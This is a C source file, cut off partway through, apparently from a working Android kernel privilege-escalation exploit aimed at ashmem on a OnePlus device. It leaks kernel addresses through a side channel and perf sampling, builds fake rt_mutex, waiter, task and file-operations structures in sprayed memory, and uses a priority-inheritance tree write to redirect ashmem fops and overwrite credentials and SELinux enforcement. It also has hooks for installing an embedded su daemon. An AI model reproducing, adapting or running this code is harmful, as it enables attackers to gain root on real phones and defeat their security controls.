#include "common.h"
#include "runtime_struct_offsets.h"
#include "kernelsnitch/kernelsnitch.h"
#include <linux/perf_event.h>

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
static pid_t child_leak;

uint64_t page_base;
uint64_t last_mm_struct;
uint64_t fake_lock;
uint64_t fake_w0;
uint64_t fake_task;
uint64_t fake_parent;
uint64_t fake_right;
uint64_t fake_left;
uint64_t fake_fops;
uint64_t binwrite_target;
/* PI-write triple for the setsockopt route (mode 4): same (pc, right, left) that
 * prepare_skb_payload() puts into W0's pi_tree inside the fake page. */
uint64_t ssopt_write_pc;
uint64_t ssopt_write_right;
uint64_t ssopt_write_left;
char ashmem_path[256] = "/dev/ashmem";

/* 2-write support */
int pselect_custom_write;
uint64_t pselect_custom_target;
uint64_t pselect_custom_value;
int pselect_child_node;  /* 1=write page+0x100 (preserves initialized), 0=write zero */

void set_pselect_write_mode(uint64_t target, uint64_t value, int mode) {
  pselect_custom_target = target;
  pselect_custom_value = value;
  pselect_custom_write = mode;
}

void clear_pselect_write(void) {
  pselect_custom_write = 0;
  pselect_custom_target = 0;
  pselect_custom_value = 0;
}

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

uintptr_t current_kernelsnitch_mm_struct(void) {
  return ks->mm_struct;
}

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
  return leaked;
}

__attribute__((weak))
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }
  errno = ENOSYS;
  return 0;
}

__attribute__((weak))
int install_embedded_wallpaper(void) {
  errno = ENOSYS;
  return 0;
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)p0_phys_offset,
             (unsigned long long)p0_kernel_phys_load,
             (unsigned long long)(p0_kernel_phys_load - p0_phys_offset),
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);  fsync(1);     /* survive a later kill/panic */
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3;    /* SCHED_BATCH — nice change triggers PI walk (pi=true) */
  attr.sched_nice = nice_value;
  errno = 0;
#ifdef COMPAT32
  long ret = syscall(380 /* __NR_sched_setattr (ARM EABI) */, tid, &attr, 0);
#else
  long ret = syscall(274, tid, &attr, 0);
#endif
  if (ret != 0) {
    pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
  }
  return ret;
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

/* Physical load address of the kernel image. Chosen by the bootloader, so it
 * varies per SoC/board and is NOT derivable from the kernel image or DT.
 * Verified on OnePlus 15 (SM8850/canoe) via /proc/iomem "Kernel code" =
 * 0xc7810000 (= _stext; _text is 0x10000 lower) -> 0xc7800000, stable across
 * boots. Override at runtime with KPHYS=0x... when porting to a new board. */
uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
uint64_t p0_phys_offset = P0_PHYS_OFFSET;
uint64_t p0_kimage_text_base = _KIMAGE_TEXT_BASE_DEFAULT;

uintptr_t g_init_cred_image;

void init_p0_profile(void) {
  if (!g_init_cred_image) g_init_cred_image = INIT_CRED;
  char *v = getenv("KPHYS");
  if (v) {
    p0_kernel_phys_load = strtoull(v, NULL, 0);
  }
  pr_info("p0 kernel_phys_load=%016llx phys_offset=%016llx delta=%016llx\n",
          (unsigned long long)p0_kernel_phys_load,
          (unsigned long long)p0_phys_offset,
          (unsigned long long)(p0_kernel_phys_load - p0_phys_offset));
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = p0_kernel_phys_load + off;
  return ((phys - p0_phys_offset) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - (p0_kernel_phys_load - p0_phys_offset);
}

uintptr_t data_addr(uintptr_t image_addr) {
  /* Known slide -> canonical image mapping (RW for .data), the same page as the
   * linear alias but independent of the unknown loader phys delta.  See §22.2. */
  if (kaslr_slide != 0) {
    return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
  }
  return p0_data_alias(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

static void fill_init_cred_copy(unsigned char *p, size_t off) {
  unsigned char *c = p + off;
  memset(c, 0, 136);
  put32(c, 0, 1);
  put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
  put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  /* FIX_RW: configfs_{read,write}_bin_file are the OLD-style .read/.write
   * ops (file,buf,count,ppos), not .{read,write}_iter.  Put them in the
   * .read/.write slots; leave read_iter/write_iter = 0. */
  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE));
  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  int prepare_slabs = env_int_range("PREPARE_SLABS", 32, 4, 64);
  prepare_ctx.mm_cnt = prepare_slabs * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  /* FOPS_AT_WRITE: the chain[11] walk empirically writes (page+0x319) =
   * (fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF)|1 into *(ashmem_misc.fops),
   * NOT write_pc.  Put the real fops table exactly there (built by the
   * pre-CFI repair, after the walk has rearranged W0's pi_tree). */
  fake_fops = payload_base + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 1;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    if (pselect_custom_write) {
      if (pselect_child_node) {
        if (pselect_custom_write == 4) {
          /* Write 4 (fops redirect): the actual write goes through W0's
           * pi_tree (not the main tree). Set main tree to harmless values.
           * The real write: rb_set_parent(pi_right=MISC_FOPS, parent=fake_fops)
           * → writes fake_fops|color to *(MISC_FOPS). See pi_waiters setup below. */
          fake_right = 0;
        } else if (pselect_custom_write == 3) {
          fake_right = pselect_custom_value;
        } else if (pselect_custom_write == 2) {
          /* Write 2 (cred): child = REAL init_cred (P0 address).
           * child->__rb_parent_color corrupts init_cred.usage (bytes 0-7)
           * but that's just a ref count — large value = won't be freed.
           * uid/caps/security/user_ns all stay intact at offsets 8+. */
          fake_right = data_addr(g_init_cred_image);
        } else {
          /* Write 1 (selinux): child = base+0x100 → byte0=0, byte1=1 */
          fake_right = base + 0x100;
        }
      } else {
        fake_right = 0;  /* leaf: write 0 */
      }
      fake_left = 0;
      if (pselect_custom_write == 2) {
        fake_fops = payload_base + CRED_COPY_OFF;
      }
      fake_parent = pselect_custom_target - 8;
      if (!pselect_custom_value) {
        pselect_custom_value = fake_fops;
      }
    } else {
      fake_parent = fake_fops;
      fake_right = (kaslr_slide != 0) ? canon_addr(ASHMEM_MISC_FOPS)
                                      : data_addr(ASHMEM_MISC_FOPS);
      if (env_flag("WRITE4_SCRATCH", 0))
        fake_right = payload_base + SCRATCH_OFF + 0x40; /* harmless: our page */
      fake_left = 0;
    }
    /* In-page scratch.  payload_base+0x800 == page_base-0x680, which is
     * OUTSIDE this port's single 4 KB memfd page; keep the CFI test fully
     * inside the page (payload_base+LOCK_OFF == page_base). */
    binwrite_target = payload_base + LOCK_OFF + 0x700;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

  uintptr_t write_pc = fake_parent;
  uintptr_t write_right = fake_right;
  uintptr_t write_left = fake_left;
  uint64_t waiter_task = env_flag("SSOPT_FAKE_TASK", 0) ? fake_task
                                                        : data_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = env_flag("SSOPT_FAKE_TASK", 0) ? fake_task
                                                        : data_addr(INIT_TASK);
  if (pselect_custom_write == 4) {
    /* Mode 4 fops redirect: W0's pi_tree drives the write.
     * pi_parent = fake_fops (parent for rb_set_parent)
     * pi_right = ASHMEM_MISC_FOPS (child that gets rb_set_parent called on it)
     * rb_set_parent(child=MISC_FOPS, parent=fake_fops) writes fake_fops|color to *MISC_FOPS */
    { /* diagnostic: allow overriding the value written by mode-4 */
      const char *wpt = getenv("WRITE_PC_TEST");
      write_pc = (wpt && *wpt) ? strtoull(wpt, NULL, 0)
                               : payload_base + FOPS_TABLE_OFF;  /* dummy node */
    }
    write_right = (kaslr_slide != 0) ? canon_addr(ASHMEM_MISC_FOPS)
                                     : data_addr(ASHMEM_MISC_FOPS);
    if (env_flag("WRITE4_SCRATCH", 0))
      write_right = payload_base + SCRATCH_OFF + 0x40; /* harmless: our page */
    write_left = 0;
  }
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_LOGGERS_0_1;
    write_right = 0;
    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
    waiter_task = SLIDE_INIT_TASK;
    task_group = SLIDE_ROOT_TASK_GROUP;
    pi_top_task = SLIDE_INIT_TASK;
  }

  /* Publish the PI-write triple for do_setsockopt_fake_lock_route().
   * Usable only when rb_left == 0 (so rb_erase_cached() takes case 1) and both
   * the value and the target are non-NULL; otherwise the route keeps the
   * waiter's tree_entry zeroed and relies on chain[11] via W0's pi_tree. */
  if (write_left == 0 && write_pc != 0 && write_right != 0) {
    ssopt_write_pc = write_pc;
    ssopt_write_right = write_right;
    ssopt_write_left = write_left;
  } else {
    ssopt_write_pc = ssopt_write_right = ssopt_write_left = 0;
  }

  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      /* Design v3 (setsockopt route): owner = 0 so chain[9] "if
       * (!rt_mutex_owner(lock))" ends the chain walk right after chain[7]
       * already performed the write -- no fake_task / pi_waiters dependency.
       * With owner != 0 the walk continues into [10]/[11] and reads
       * waiter->task, the one field an IRQ can clobber on T's stack. */
      put64(p, LOCK_OFF + 0x18,
            env_flag("SSOPT_OWNER0", 1) ? 0 : (fake_task | 1));
    }

    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    /* W0 is fake_lock->waiters.rb_leftmost (rt_mutex_top_waiter check: its
     * ->lock@0x38 must equal fake_lock, set below).  Its prio must be BELOW the
     * waiter's prio (= task->prio, the consumer sets nice=19 -> 139) so that
     * rt_mutex_enqueue() sends W to W0's right: rb_leftmost then stays W0 and
     * chain[9]'s "prerequeue_top_waiter != top_waiter" wake_up_process() is
     * skipped. */
    if (env_flag("SSOPT_OWNER0", 1))
      put32(p, W0_OFF + 0x40, 100);
    int compact = active_offsets && active_offsets->waiter_compact;
    if (compact) {
      /* 4.14 rt_mutex_waiter: tree@0x00 pi_tree@0x18 task@0x30 lock@0x38 prio@0x40 deadline@0x48 */
      put64(p, W0_OFF + 0x18, write_pc);
      put64(p, W0_OFF + 0x20, write_right);
      put64(p, W0_OFF + 0x28, write_left);
      put64(p, W0_OFF + 0x30, waiter_task);
      put64(p, W0_OFF + 0x38, fake_lock);
      put32(p, W0_OFF + 0x40, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + 0x48, 0);
    } else {
      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
    }

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      if (pselect_custom_write == 4) {
        /* Mode 4 (fops redirect): pi_waiters points to W0's pi_tree.
         * rt_mutex_dequeue_pi will rb_erase W0's pi_tree entry,
         * causing rb_set_parent to write fake_fops to ASHMEM_MISC_FOPS. */
        {
          uint64_t piroot = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
          uint64_t pileft = 0;
          const char *e1 = getenv("RBROOT_OFF");
          const char *e2 = getenv("RBLEFT_OFF");
          if (e1) piroot = payload_base + strtoull(e1, NULL, 0);
          if (e2) pileft = payload_base + strtoull(e2, NULL, 0);
          pr_info("ssopt pi_waiters rb_root=%016llx rb_leftmost=%016llx\n",
                  (unsigned long long)piroot, (unsigned long long)pileft);
          put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, piroot);
          put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, pileft);
        }
      } else if (pselect_custom_write) {
        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
      } else {
        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
      }
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
      if (pselect_custom_write >= 2) {
        fill_init_cred_copy(p, CRED_COPY_OFF);
      }
    }
  }
  return 1;
}

static void log_sync(void) { fsync(1); }

/* ============================================================================
 * Leak the dangling waiter's kernel-stack address (RB_EMPTY_NODE route).
 * ========================================================================== */
static int ssopt_perf_fd = -1;
static unsigned char *ssopt_perf_buf;
static size_t ssopt_perf_msz;
uint64_t ssopt_leaked_waiter;

int ssopt_perf_begin(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  /* keep well under kernel.perf_event_max_sample_rate (~80 kHz) so the burst
   * never trips the hardware watchdog (see BAN_GIAO §18.2). */
  pe.sample_period = (uint64_t)env_int_range("LEAK_PERIOD", 20000, 200, 1000000);
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;
  ssopt_perf_fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (ssopt_perf_fd < 0) { pr_warning("perf_event_open(waiter) errno=%d\n", errno); return -1; }
  ssopt_perf_msz = PAGE_SIZE * 33;
  ssopt_perf_buf = mmap(0, ssopt_perf_msz, PROT_READ | PROT_WRITE, MAP_SHARED,
                        ssopt_perf_fd, 0);
  if (ssopt_perf_buf == MAP_FAILED) {
    ssopt_perf_buf = NULL; close(ssopt_perf_fd); ssopt_perf_fd = -1;
    pr_warning("perf mmap(waiter) errno=%d\n", errno); return -1;
  }
  ioctl(ssopt_perf_fd, PERF_EVENT_IOC_ENABLE, 0);
  return 0;
}

static int ssopt_ip_in(uint64_t ip, uint64_t sym_off, uint64_t len) {
  uint64_t a = ip & 0x1fffffULL, b = sym_off & 0x1fffffULL;
  return (a >= b && a - b < len);
}

/* --- accumulators across drains (mode over accepted candidates) --- */
static uint64_t wl_cand[16];
static int wl_cnt[16], wl_nc;
static int wl_samples, wl_insock, wl_insys;
static int wl_ring_lost;
static uint64_t wl_lo_hist[256];                 /* SP & 0x3fff histogram */
static uint64_t wl_abi_hist[4];                  /* abi histogram */
static uint64_t wl_lo_mask = 0x3d10;             /* waiter mod 0x4000 (measured) */

void ssopt_set_waiter_lo(void) {
  char *e = getenv("WAITER_LO14");
  if (e) wl_lo_mask = strtoul(e, 0, 0);
}

void ssopt_perf_drain(void) {
  if (ssopt_perf_fd < 0 || !ssopt_perf_buf) return;
  struct perf_event_mmap_page *hdr = (void *)ssopt_perf_buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  unsigned char *base = ssopt_perf_buf + PAGE_SIZE;
  size_t dsz = ssopt_perf_msz - PAGE_SIZE;
  uint64_t pos = hdr->data_tail;
  int scanned = 0;
  while (pos < head && scanned < 20000) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    scanned++;
    if (ev->type == PERF_RECORD_SAMPLE) {
      wl_samples++;
      unsigned char *p = (unsigned char *)ev + sizeof(*ev);
